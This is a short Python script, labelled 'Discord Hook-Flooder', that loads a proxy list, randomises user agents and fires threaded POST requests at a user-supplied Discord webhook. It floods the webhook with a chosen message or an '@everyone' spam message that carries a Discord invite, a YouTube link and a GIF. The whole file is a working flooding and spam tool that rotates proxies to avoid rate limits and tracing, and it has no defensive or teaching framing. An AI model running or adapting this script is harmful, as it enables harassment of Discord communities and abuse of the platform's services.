#Code By AKANINE
#Discord Hook-Flooder

import requests
from requests import post
import random
import threading
from fake_useragent import UserAgent

ua = UserAgent()
a = ua.random
user_agent = ua.random

useragent = user_agent

proxy = set()

with open("HTTP.txt", "r") as f:
    file_lines1 = f.readlines()
    for line1 in file_lines1:
        proxy.add(line1.strip())
        
proxies = {
    'http': 'http://'+random.choice(list(proxy))
}

proxy1 = {
    random.choice(list(proxy))
}

Hookv2 = (f"@everyone  https://discord.gg/rabbitsq" + ' ' +  "https://www.youtube.com/watch?v=AMCwYdTJ_PE&list" + ' ' + "https://cdn.discordapp.com/attachments/989142902124998666/989155421455548466/MOSHED-2022-1-21-16-25-5.gif")
Hook = input("Hook >")
msg = input("Mss >")
flood = int(input("flood >"))

def floodv1():
    requests.post(Hook, proxies=proxies, headers={"User-Agent": useragent}, json={'content': msg})
    

def floodv2():
    requests.post(Hook, proxies=proxies, headers={"User-Agent": useragent}, json={'content': Hookv2})

for aka in range(flood):
        th = threading.Thread(target = floodv1)
        th = threading.Thread(target = floodv2)
        th.start()